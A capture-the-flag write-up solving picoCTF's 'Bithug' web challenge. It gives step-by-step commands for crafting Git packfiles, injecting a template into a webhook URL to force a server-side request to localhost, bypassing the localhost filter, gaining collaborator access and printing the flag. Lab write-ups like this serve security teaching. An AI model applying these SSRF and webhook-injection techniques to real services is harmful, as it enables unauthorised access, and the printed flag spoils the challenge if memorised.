# Full Step-by-Step Walkthrough for picoCTF "Bithug" Challenge
I have finished the "Bithug" Challenge (Hard level) from PicoCTF, and here is my walkthrough for you:
#
This walkthrough assumes you have:
- Access to the challenge instance (`http://venus.picoctf.net:<port>` – replace `<host>` and `<port>` accordingly).
- Tools like Wireshark (for packet capture), a hex editor (e.g., Hex Fiend or online tools), CyberChef (for base64 encoding), and Git.
- Basic knowledge of Git and HTTP.

The exploit chain:
1. Capture Git packfiles for adding a collaborator and triggering the webhook.
2. Create a webhook with template injection to SSRF a localhost request.
3. Trigger the webhook to add yourself as a collaborator to `/_/zwade.git`.
4. Clone the target repo and extract the flag.
#
## Step 1: Register and Set Up Your Repository
1. Navigate to the BitHug web interface (`http://<host>:<port>`).
2. Register a new user account. Use a simple username like hacker and password like pass. Log in.
3. Create a new repository named exploit (this will be your victim repo for webhooks).
4. Clone the repository locally:
```text
git clone http://hacker@<host>:<port>/hacker/exploit.git
cd exploit
```
  Enter your password when prompted. This sets up basic auth for Git operations.
#
## Step 2: Capture the "Add Collaborator" Packfile (Payload A)
This packfile will be used in the webhook body to update `access.conf` in `/_/zwade.git`, adding your username (`hacker`) as a collaborator. 
1. In your local `exploit repo`, create the collaborator commit:
```text
git checkout --orphan collab-branch
echo "hacker" > access.conf
git add access.conf
git commit -m "Add hacker as collaborator"
```
2. Set up packet capture to grab the HTTP POST body for `git-receive-pack`:
   - Start Wireshark and filter for HTTP traffic to `<host>:<port>`.
   - Or use `tcpdump` on your interface: `sudo tcpdump -i any -w capture.pcap host <host> and port <port>`.

3. Push to refs/meta/config (this triggers the receive-pack request):
```text
git push origin @:refs/meta/config
```
  Enter credentials if prompted.

4. In Wireshark:
      - Find the POST request to `/hacker/exploit.git/git-receive-pack`.
      - Follow the TCP/HTTP stream.
      - Switch to "C Arrays" or "Hex" view.
      - Copy the entire raw body (starting from the packfile header, e.g., `0030...` up to the end of the zlib-compressed pack). It should look like a long hex string (around 500-1000 bytes).

Example snippet (yours will vary based on commit hash; full example from a writeup):
```text
0x30, 0x30, 0x39, 0x34, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30,
0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30,
0x30, 0x30, 0x30, 0x30, 0x30, 0x20, 0x65, 0x37, 0x38, 0x36, 0x64, 0x65, 0x62, 0x61, 0x39, 0x36,
... (continues with new OID, "refs/meta/config\0", capabilities like "report-status side-band-64k agent=git/2.25.10000PACK", then pack data)
```
5. Paste the hex into CyberChef or a Python script to convert to binary, then base64-encode it (webhooks store bodies as base64). Python example:
```python
import binascii
import base64

hex_data = "30393034303030303030303030303030303030303030303030303030303030303030303030303020..."  # Your full hex string without 0x
binary_data = binascii.unhexlify(hex_data)
print(base64.b64encode(binary_data).decode('utf-8'))
```
Save the base64 output as `payload_a_b64` (`MDA5NDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAgZTc4NmRlYmE5NjcwNDM0NTQxYzBlNmY2YTQwZTliZDI2ZjE4YTk4YSByZWZzL21ldGEvY29uZmlnACByZXBvcnQtc3RhdHVzIHNpZGUtYmFuZC02NGsgYWdlbnQ9Z2l0LzIuMjUuMTAwMDBQQUNLAA...`).
#
## Step 3: Capture and Craft the "Trigger" Packfile (Payload B)
This packfile triggers the webhook by pushing to a malicious `ref` that injects the SSRF URL via template `{{ref}}`.
1. In your local exploit repo, create a commit with a long branch name (to make hex editing easier):
```text
git checkout -b long-trigger-branch
echo "trigger" > trigger.txt
git add trigger.txt
git commit -m "Trigger commit"
```
2. Capture the push again with Wireshark/tcpdump:
```text
git push origin long-trigger-branch
```
3. Extract the hex body from the POST to `/git-receive-pack` (similar to Step 2).The structure is:
     - 4-byte length (e.g., `0034` for a 52-char line).
     - `<40 zero bytes> <40-char new OID> <ref string>\0 <capabilities>\0 <zlib pack>`.

Example hex snippet:
```text
0034000000000000000000000000000000000000000000000000000000000000000000000000 <new_oid> refs/heads/long-trigger-branch\0 report-status side-band-64k agent=git/2.25.10000PACK\0 <pack>
```
4. Open in a hex editor:
    - Locate the `<ref string>` (after the second 40-char hex block, before `\0`).
    - Replace it with: `127.0.0.1:1823/_/zwade.git/git-receive-pack?a` (length: 41 chars).
    - Update the 4-byte length prefix at the start: Convert new line length (old length + delta) to hex, zero-padded (e.g., if new line is 81 chars total, length=81=0x51, so `0051`).
    - Keep everything else (OIDs, capabilities, pack) intact – the server only uses the `ref` for templating.

5. Convert the edited hex back to binary (as in Step 2's Python script), but do not base64 – you'll POST this raw.
#
## Step 4: Create the Malicious Webhook
1. Use curl or Burp Suite to POST to the webhook endpoint (authenticate with your session cookie or Basic Auth):
```text
curl -X POST http://<host>:<port>/hacker/exploit.git/webhooks \
  -H "Authorization: Basic $(echo -n 'hacker:pass' | base64)" \
  -H "Content-Type: application/json" \
  -d '{
    "url": "http://{{ref}}.com",
    "body": "'$payload_a_b64'",
    "contentType": "application/x-git-receive-pack-request"
  }'
```
  - The URL uses template injection: {{ref}} will be replaced with the trigger ref (e.g., 127.0.0.1:1823/_/zwade.git/git-receive-pack?a).
  - Filters block direct localhost/port 80, but templating bypasses this during execution.
  - Response: {} if successful.
#
## Step 5: Trigger the Webhook (Execute SSRF)
POST the crafted trigger packfile (Payload B) to your repo's receive-pack endpoint to simulate a push:
```text
curl -X POST http://<host>:<port>/hacker/exploit.git/git-receive-pack \
  --data-binary @trigger_packfile.bin \
  -H "Authorization: Basic $(echo -n 'hacker:pass' | base64)" \
  -H "Content-Type: application/x-git-receive-pack-request"
```
  - Create `trigger_packfile.bin` from your edited hex: `xxd -r -p edited.hex > trigger_packfile.bin`.
  - The server processes this as a push: Parses `ref` as the SSRF URL, formats webhook URL to `http://127.0.0.1:1823/_/zwade.git/git-receive-pack?a.com`.
  - It then POSTs Payload A (decoded) to that URL. Since it's from localhost, you get admin privileges, allowing the update to `/_/zwade.git`'s `access.conf`.
#
## Step 6: Access the Target Repository and Get the Flag
1. Now that you're a collaborator, clone the hidden repo:
```text
git clone http://hacker@<host>:<port>/_/zwade.git
cd zwade
```
2. Read the flag
```text
cat README.md
```
Output: `picoCTF{good_job_at_gitting_good}`
#
# Troubleshooting Tips
- Hex editing errors: Ensure the line length is correctly calculated (total bytes of `<old> <new> <ref>\0`). Test by pushing a manually crafted simple pack to your own repo.
- Capture issues: If Wireshark is tricky remotely, run the challenge locally via Docker (from source) and log `req.body.toString('hex')` in `git-api.ts`.
- Port/Host: The internal port is 1823 (from Dockerfile); adjust SSRF ref if needed.
- Variations: Commit hashes/OIDs change; always recapture for accuracy.

This exploit combines SSRF, template injection, and Git protocol abuse! If you hit issues, double-check hex lengths or share your captured packfile hex for debugging.




























